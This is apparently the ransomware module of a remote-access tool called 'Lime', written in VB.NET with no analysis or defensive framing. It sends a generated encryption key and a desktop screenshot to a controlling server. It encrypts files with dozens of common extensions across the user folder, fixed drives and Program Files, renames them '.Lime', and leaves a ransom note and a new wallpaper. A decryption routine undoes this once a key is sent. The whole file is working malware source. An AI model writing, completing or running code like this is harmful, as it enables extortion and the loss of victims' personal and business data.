Imports System.Text
Imports System.Security.Cryptography
Imports System.IO
Imports System.Drawing
'credit to hidden-tear creator
Namespace Lime
    Module Encryption
        Public A1
        Public A2
        Public C As SK
        Private Declare Sub keybd_event Lib "user32" (ByVal bVk As Byte, ByVal bScan As Byte,
        ByVal dwFlags As Long, ByVal dwExtraInfo As Long)
        Private Const KEYEVENTF_KEYUP = &H2
        Private Const VK_LWIN = &H5B
        Public HW = ID.UserName + "_" + ID.HWID
        Public C_DIR = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 3)
        Public username = Environment.UserName
        Public key As String
        Public num As Integer

        Public Sub BeforeAttack(ByVal msg As String, ByRef pic As String)
            A1 = msg
            A2 = pic
            Dim T1 As Threading.Thread = New Threading.Thread(AddressOf Attack)
            T1.Start()
        End Sub

        Public Sub Attack()
            On Error Resume Next

            Dim readValue = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Lime", "Ransome-Status", Nothing)
            If readValue = "Encrypted" Or readValue = "Encryption in progress..." Or readValue = "Encryption in progress..." Then
                C.Send("MSG" + C.SPL + "Ransomware is already started!")
                Exit Sub
            End If

            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Lime", "Ransome-Status", "Encryption in progress...")
            Dim key As String = CreatePWD(15)
            C.Send("GET-PASS" + C.SPL + HW + C.SPL + key)
            C.Send(("c_ransome" & C.SPL & "Encryption in progress..."))

            Dim T1 As New Threading.Thread(AddressOf Enc_Prog)
            Dim T2 As New Threading.Thread(AddressOf Enc_Driver)
            Dim T3 As New Threading.Thread(AddressOf Enc_User)

            T1.Start()
            T2.Start()
            T3.Start()


            Do Until num = 3

                Threading.Thread.Sleep(1000)
            Loop
            num = Nothing

            Messager(A1, A2)
            key = Nothing
            C.Send(("c_ransome" & C.SPL & "Encrypted"))
            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Lime", "Ransome-Status", "Encrypted")
            SC()
            Dim proc As New Threading.Thread(AddressOf MISC.Proc)
            'proc.Start()
            Exit Sub
        End Sub

        Public Sub Enc_User(ByVal password As String)
            On Error Resume Next
            Dir_En(C_DIR & "Users\" & username & "\", key)
            num += 1
        End Sub

        Public Sub Enc_Driver(ByVal password As String)
            On Error Resume Next
            For Each drive In Environment.GetLogicalDrives
                Dim Driver As DriveInfo = New DriveInfo(drive)
                If Driver.DriveType = DriveType.Fixed AndAlso Not Driver.ToString.Contains(C_DIR) Then
                    Dim DriverPath As String = drive
                    Dir_En(DriverPath, key)
                End If
            Next
            num += 1
        End Sub

        Public Sub Enc_Prog(ByVal password As String)
            If ID.AmiAdmin = "Administrator" Then
                Dir_En(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\", key)
            End If
            num += 1
        End Sub

        Public Function AES_Enc(ByVal B2Enc As Byte(), ByVal KeyBytes As Byte()) As Byte()
            On Error Resume Next
            Dim EncBytes As Byte() = Nothing
            Dim saltBytes As Byte() = New Byte() {1, 2, 3, 4, 5, 6, 7, 8}
            Using ms As MemoryStream = New MemoryStream()
                Using AES As RijndaelManaged = New RijndaelManaged()
                    AES.KeySize = 256
                    AES.BlockSize = 128
                    Dim key = New Rfc2898DeriveBytes(KeyBytes, saltBytes, 1000)
                    AES.Key = key.GetBytes(AES.KeySize / 8)
                    AES.IV = key.GetBytes(AES.BlockSize / 8)
                    AES.Mode = CipherMode.CBC
                    Using cs = New CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write)
                        cs.Write(B2Enc, 0, B2Enc.Length)
                        cs.Close()
                    End Using

                    EncBytes = ms.ToArray()
                End Using
            End Using

            Return EncBytes
        End Function

        Public Function CreatePWD(ByVal length As Integer) As String
            On Error Resume Next
            Const valid As String = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"
            Dim str As StringBuilder = New StringBuilder()
            Dim rnd As Random = New Random()
            While 0 < Math.Max(System.Threading.Interlocked.Decrement(length), length + 1)
                str.Append(valid(rnd.[Next](valid.Length)))
            End While

            Return str.ToString()
        End Function

        Public Sub File_Enc(ByVal file As String, ByVal key As String)
            On Error Resume Next
            If file <> Reflection.Assembly.GetExecutingAssembly.Location Then
                Dim B2Enc As Byte() = IO.File.ReadAllBytes(file)
                Dim KeyBytes As Byte() = Encoding.UTF8.GetBytes(key)
                KeyBytes = SHA256.Create().ComputeHash(KeyBytes)
                Dim BytesEnc As Byte() = AES_Enc(B2Enc, KeyBytes)
                IO.File.WriteAllBytes(file, BytesEnc)
                IO.File.Move(file, file & ".Lime")
            End If
        End Sub

        Public Sub Dir_En(ByVal ThePath As String, ByVal key As String)
            On Error Resume Next
            Dim ExtensionsList = String.Concat(".txt", ".jar", ".exe", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".jpeg", ".gif", ".csv", ".py", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".dll", ".c", ".cs", ".vb", ".mp3", ".mp4", ".f3d", ".dwg", ".cpp", ".zip", ".rar", ".mov", ".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".iso", ".7z", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".uue", ".xz", ".z", ".001", ".mpeg", ".mp3", ".mpg", ".core", ".crproj", ".pdb", ".ico", ".pas", ".db", ".torrent")
            Dim files As String() = Directory.GetFiles(ThePath)
            Dim SubDirectories As String() = Directory.GetDirectories(ThePath)
            For i As Integer = 0 To files.Length - 1
                Dim exten As String = Path.GetExtension(files(i))
                If ExtensionsList.ToLower.Contains(exten.ToLower) Then
                    File_Enc(files(i), key)
                End If
            Next

            For i As Integer = 0 To SubDirectories.Length - 1
                Dir_En(SubDirectories(i), key)
            Next
        End Sub

        Private Declare Ansi Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (uAction As Integer, uParam As Integer, <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.VBByRefStr)> ByRef lpvParam As String, fuWinIni As Integer) As Integer
        Public Sub Messager(ByVal msg As String, ByRef img As String)
            Try
                C.Send("MSG" + C.SPL + "Files have been ecrypted successfully!")
                Dim path As String = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
                Dim fullpath As String = path + "\READ-ME-NOW.txt"
                Dim Message As String() = {msg, "Your ID is " & HW & ""}
                File.WriteAllLines(fullpath, Message)


                Dim NewFile = IO.Path.GetTempFileName + ".jpeg"
                File.WriteAllBytes(NewFile, Convert.FromBase64String(img))

                Dim registryKey As Microsoft.Win32.RegistryKey = My.Computer.Registry.CurrentUser.OpenSubKey("Control Panel\Desktop", True)
                registryKey.SetValue("WallpaperStyle", "2")
                registryKey.SetValue("TileWallpaper", "0")
                SystemParametersInfo(20, 0, NewFile, 1)
            Catch ex As Exception
                C.Send("MSG" & C.SPL & "[ERROR] " & ex.Message)
            End Try
        End Sub

        Public Sub SC()
            On Error Resume Next
            keybd_event(VK_LWIN, 0, 0, 0)
            keybd_event(77, 0, 0, 0)
            keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0)

            Threading.Thread.CurrentThread.Sleep(1000)

            Dim bounds As Rectangle
            Dim screenshot As Bitmap
            Dim graph As Graphics
            bounds = Windows.Forms.Screen.PrimaryScreen.Bounds
            screenshot = New Bitmap(bounds.Width, bounds.Height, Imaging.PixelFormat.Format32bppArgb)
            graph = Graphics.FromImage(screenshot)
            graph.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy)
            Dim TempFileName = Path.GetTempFileName + ".jpeg"
            screenshot.Save(TempFileName, Imaging.ImageFormat.Jpeg)

            Dim Online As Boolean
            Do Until Online = True
                Online = SK.S.Connected
                If Online = True Then
                    C.Send("SC" + C.SPL + HW + C.SPL + Convert.ToBase64String(File.ReadAllBytes(TempFileName)))
                End If
                Threading.Thread.CurrentThread.Sleep(10000)
            Loop

        End Sub

    End Module
End Namespace
'######################################################################

Namespace Lime
    Module Decryption
        Public P1
        Public HW = ID.UserName + "_" + ID.HWID


        Public Sub BeforeDec(ByVal key As String)
            P1 = key

            Dim D1 As Threading.Thread = New Threading.Thread(AddressOf Dec)
            D1.Start()
        End Sub



        Public Sub Dec(ByVal key As String)
            On Error Resume Next
            Dim readValue = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Lime", "Ransome-Status", Nothing)
            If readValue <> "Encrypted" Or readValue = "Decryption In progress..." Or readValue = "Encryption in progress..." Then
                Exit Sub
            End If

            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Lime", "Ransome-Status", "Decryption in progress...")
            C.Send(("c_ransome" & C.SPL & "Decryption in progress..."))

            Dim T1 As New Threading.Thread(AddressOf Dec_Prog)
            Dim T2 As New Threading.Thread(AddressOf Dec_Driver)
            Dim T3 As New Threading.Thread(AddressOf Dec_User)

            T1.Start()
            T2.Start()
            T3.Start()


            Do Until num = 3

                Threading.Thread.Sleep(1000)
            Loop
            num = Nothing

            P1 = Nothing
            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Lime", "Ransome-Status", "Decrypted")
            C.Send(("c_ransome" & C.SPL & "Decrypted"))

            Dim Online As Boolean
            Do Until Online = True
                Online = SK.S.Connected
                If Online = True Then
                    C.Send("DEL-PASS" + C.SPL + HW)
                End If
                Threading.Thread.CurrentThread.Sleep(10000)
            Loop
            Exit Sub

        End Sub

        Public Sub Dec_User(ByVal password As String)
            On Error Resume Next
            Dir_Dec(C_DIR & "Users\" & username & "\", P1)
            num += 1
        End Sub

        Public Sub Dec_Driver(ByVal password As String)
            On Error Resume Next
            For Each drive In Environment.GetLogicalDrives
                Dim Driver As DriveInfo = New DriveInfo(drive)
                If Driver.DriveType = DriveType.Fixed AndAlso Not Driver.ToString.Contains(C_DIR) Then
                    Dim DriverPath As String = drive
                    Dir_Dec(DriverPath, P1)
                End If
            Next
            num += 1
        End Sub

        Public Sub Dec_Prog(ByVal password As String)
            If ID.AmiAdmin = "Administrator" Then
                Dir_Dec(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) & "\", P1)
            End If
            num += 1
        End Sub

        Public Function AES_Dec(ByVal B2Dec As Byte(), ByVal KeyBytes As Byte()) As Byte()
            On Error Resume Next
            Dim DecBytes As Byte() = Nothing
            Dim saltBytes As Byte() = New Byte() {1, 2, 3, 4, 5, 6, 7, 8}
            Using ms As MemoryStream = New MemoryStream()
                Using AES As RijndaelManaged = New RijndaelManaged()
                    AES.KeySize = 256
                    AES.BlockSize = 128
                    Dim key = New Rfc2898DeriveBytes(KeyBytes, saltBytes, 1000)
                    AES.Key = key.GetBytes(AES.KeySize / 8)
                    AES.IV = key.GetBytes(AES.BlockSize / 8)
                    AES.Mode = CipherMode.CBC
                    Using cs = New CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write)
                        cs.Write(B2Dec, 0, B2Dec.Length)
                        cs.Close()
                    End Using

                    DecBytes = ms.ToArray()
                End Using
            End Using

            Return DecBytes
        End Function

        Public Sub File_Dec(ByVal file As String, ByVal key As String)
            On Error Resume Next
            Dim B2Dec As Byte() = IO.File.ReadAllBytes(file)
            Dim KeyBytes As Byte() = Encoding.UTF8.GetBytes(key)
            KeyBytes = SHA256.Create().ComputeHash(KeyBytes)
            Dim BytesDec As Byte() = AES_Dec(B2Dec, KeyBytes)
            IO.File.WriteAllBytes(file, BytesDec)
            Dim exten As String = System.IO.Path.GetExtension(file)
            Dim result As String = file.Substring(0, file.Length - exten.Length)
            IO.File.Move(file, result)
        End Sub

        Public Sub Dir_Dec(ByVal ThePath As String, ByVal key As String)
            On Error Resume Next
            Dim files As String() = Directory.GetFiles(ThePath)
            Dim SubDirectories As String() = Directory.GetDirectories(ThePath)
            For i As Integer = 0 To files.Length - 1
                Dim exten As String = Path.GetExtension(files(i))
                If exten = ".Lime" Then
                    File_Dec(files(i), key)
                End If
            Next

            For i As Integer = 0 To SubDirectories.Length - 1
                Dir_Dec(SubDirectories(i), key)
            Next

        End Sub

    End Module
End Namespace